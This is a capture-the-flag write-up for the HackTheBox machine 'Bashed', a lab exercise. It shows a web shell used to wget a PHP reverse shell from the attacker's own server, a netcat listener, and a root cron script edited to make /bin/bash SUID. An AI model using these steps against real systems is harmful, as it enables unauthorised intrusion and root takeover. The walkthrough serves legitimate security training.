Hello, welcome to the Bashed Writeup from [HackTheBox](https://app.hackthebox.com/machines/Bashed).

## Enumeration

---

### NMAP Open ports

In first step, we are going to enumerate the list of open ports with NMAP.

![NMAP](/assets/img/htb/Bashed/nmap.png)

**Port 80:** HTTP

### Whatweb

![WhatWeb](/assets/img/htb/Bashed/whatweb.png)
**Apache**: 2.4.18

As we can see in the above image, we have a web server running on port 80, so lets take a look.

![Web](/assets/img/htb/Bashed/web.png)

We found **phpbash**, seems like its a tool actually developed in this server so lets take a look in github:
[PHPBash](https://github.com/Arrexel/phpbash)

> Phpbash is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.

In this case, i can imagine that we have somewhere a **phpbash.php** that maybe we can use, so lets use **gobuster** to enumerate directories.
![Gobuster](/assets/img/htb/Bashed/gobuster.png)

After enumerate some directories, we found in **/dev** two scripts in **PHP**:

Lets find out!

## Exploitation

Like we saw before, **phpbash.php** its a web shell, so lets try with **wget** download a reverse shell in PHP from our machine, in this case i will use PentestMonkey one.
[PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

We open a http server in the same directory as the Reverse Shell:

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### PHPBash

With **wget** im going to download the reverse shell from our machine.
![phpbash](/assets/img/htb/Bashed/phpbash.png)

### Shell as www-data

Now we start the netcat listener in port 443 and navigate to /uploads/ennove.php (Yes, incredible name for a shell...)

```bash
nc -nlvp 443
listening on [any] 443 ...
```

After we navigate to /uploads/ennove.php, we got a shell
![Reverse](/assets/img/htb/Bashed/reverse.png)

# Flag user

```bash
www-data@bashed:/var/www/html/dev$ cat / -name user.txt 2>/dev/null
/home/arrexel/user.txt
www-data@bashed:/var/www/html/dev$ cat /home/arrexel/user.txt
FLAG :D
```

## Privilege Escalation

### Shell as scriptmanager

As www-data, lets see our sudo privileges, in this case we can run any command as scriptmanager so lets spawn a bash.
![Reverse](/assets/img/htb/Bashed/shellasscriptmanager.png)

### Shell as root

After enumeration as scriptmanager, we found a folder **scripts** with a few files.

```bash
scriptmanager@bashed:/$ cd scripts
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager
drwxr-xr-x 23 root          root
-rw-r--r--  1 scriptmanager scriptmanager
-rw-r--r--  1 root          root
```

Lets see the files:

```bash
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
testing 123!scriptmanager@bashed:/scripts
```

As we can see, **test.py** creates a **test.txt** and root is the owner but we can modify test.py, so probably who runs the python commands is root, so lets try to get permissions u+s in bash:

# Modified test.py

```bash
import os
os.system("chmod u+s /bin/bash")
```

After that, we try to run **test.py**, but **test.txt** is created as scriptmanager owner so maybe root somehow is running **test.py** (maybe a cronjob?), lets try a script to enumerate process:

```bash
#!/bin/bash
old_process=$(ps -eo command)
while true; do
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon | command | kworker"
        old_process=$new_process
done
```

```bash
chmod +x procmon.sh
./procmon.sh

> /usr/sbin/CRON -f
> /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
> python test.py
< /usr/sbin/CRON -f
< /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
< python test.py
```

As we can see, **> python test.py** is being executed in a short period time, so lets wait and watch for permissions changes:

```bash
scriptmanager@bashed:/scripts$ watch -n 1 ls -la /bin/bash
```

After 1 minute:

```bash
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
FLAG :D
```
